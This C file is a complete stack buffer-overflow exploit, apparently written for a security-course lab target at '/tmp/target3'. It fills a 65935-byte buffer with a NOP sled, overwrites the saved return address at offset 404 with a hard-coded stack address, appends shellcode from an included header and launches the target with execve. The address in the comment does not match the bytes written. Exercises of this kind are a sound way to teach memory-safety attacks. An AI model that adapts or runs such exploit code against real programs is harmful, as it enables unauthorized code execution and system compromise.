#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90
//399 : 0x018f
//65935 : 0x1018f
#define len 65935


char payload[len];

void make_payload(){
  int i = 0;
  for(i = 0; i < len; i++)
    payload[i] = NOP;

  //Buf 256 bytes
  //EBP 4   bytes
  //Want to Send to Address: 0xbffffc74
  payload[404] = 0xc8;
  payload[405] = 0xfc;
  payload[406] = 0xfe;
  payload[407] = 0xbf;

  strncpy(payload+408, shellcode, 45);

  payload[len-1] = 0x00;
}

int main(void) {
  char *len_str = "65935";
  char *args[] = { TARGET, payload, len_str, NULL };
  char *env[] = { NULL };

  make_payload();

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
